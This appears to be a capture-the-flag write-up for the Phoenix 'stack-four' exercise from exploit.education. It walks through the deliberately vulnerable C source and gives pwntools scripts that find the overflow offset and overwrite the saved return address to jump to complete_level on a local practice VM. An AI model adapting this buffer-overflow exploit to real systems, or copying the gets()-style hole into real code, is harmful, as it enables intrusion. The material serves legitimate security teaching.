## Stack-Four
---

![](https://Cyberguru1.github.io/posts/phoenix/files/st4_header.png)

### Source Code
----

```
/*
 * phoenix/stack-four, by https://exploit.education
 *
 * The aim is to execute the function complete_level by modifying the
 * saved return address, and pointing it to the complete_level() function.
 *
 * Why were the apple and orange all alone? Because the bananna split.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}

```
### Let's Analyze the code
---

```
char *gets(char *);
```
- The gets function is declared, although it is generally considered unsafe and should be avoided in favor of safer alternatives like fgets.

```
void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}
```
- The complete_level() function is defined. It prints a congratulatory message and exits the program with a status code of 0.

```
void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}
```
- The start_level() function is defined. It declares a character array called buffer with a size of 64 bytes. It then uses the unsafe gets function to read input from the user and store it in the buffer array. This is the vulnerable part of the code where a buffer overflow can occur.
   
   After reading input, the ret variable is assigned the value of the return address of the current function using the __builtin_return_address(0) function. The return address represents the address to which the program will jump after the current function finishes executing.

```
int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```
- Finally, the main() function is defined. It displays the program's banner using the BANNER macro and calls the start_level() function to start the vulnerable part of the program

### Solution to Challenge
---

The goal of this challenge is to overwrite the saved instruction pointer `$rip`, this is a standard buffer overflow challenge, similar to the previous challenge we need to somehow call the `complete_level` function all the way from main.

Using GDB to get the address of the `complete_level` function :

![](https://Cyberguru1.github.io/posts/phoenix/files/st4_f-address.png)

we got the address of the `complete_level` function to be `0x40061d`

since this is a standard buffer overflow challenge we need to find the offset at which we could overwrite the instruction, gdb-gef as a cool feature of generating a de-bruijn sequence under the method name `cyclic`

using pwntools to write a script that finds the offset at which `rip` would be overwritten:

```
#!/usr/bin/python
## script by Hamza Saidu
## enjoy!!!

from pwn import *


# complete_level address

addr = p32(0x40061d)


s = ssh(host='localhost', user='user', password='user', port=2222)

out = s.run('gdb /opt/phoenix/amd64/stack-four')
print(out.recvuntil(b'(gdb)').decode())

out.sendline('set disassembly-flavour intel')
print(out.recvuntil(b'(gdb)').decode())

out.sendline('info func')
print(out.recvuntil(b'(gdb)').decode())

#creating a de-bruijn sequence
pattern = cyclic(200, n=8) # 8 for x64 and 4 for x86

out.sendline('r')
print(out.recvuntil(b'\n').decode())

#sending the de-bruijn sequence
out.sendline(pattern)
print(out.recvuntil(b'(gdb)').decode())

#searching for the overflow offset
out.sendline('pattern search $rip')

#storing the output
output = out.recvuntil(b'(gdb)').decode()
print(output)

#extracting the offset
offset = int(re.findall(r"offset ([0-9]+=?) \(little-endian search\)", output)[0])
print(offset)

```
in the above script, we used pwntools to automate the offset calculation, after running the script the offset printed out is `88`, using this offset we could now point our rip register to the `complete_level` function address

```
#!/usr/bin/python
## script by Hamza Saidu
## enjoy!!!

from pwn import *


# complete_level address

addr = p32(0x40061d)


s = ssh(host='localhost', user='user', password='user', port=2222)
offset = 88


payload = offset * b"A"
payload += addr
payload += b"\x00\x00\x00\x00" # padded some null bytes to make it 8 bytes long

p = s.process('/opt/phoenix/amd64/stack-four')

print(p.recvuntil(b'\n').decode())

p.sendline(payload)
print(p.recvall().decode())

```

Running the script we got:

![](https://Cyberguru1.github.io/posts/phoenix/files/st4-result.png)

and waaala we got the congratz message!!!!!!!


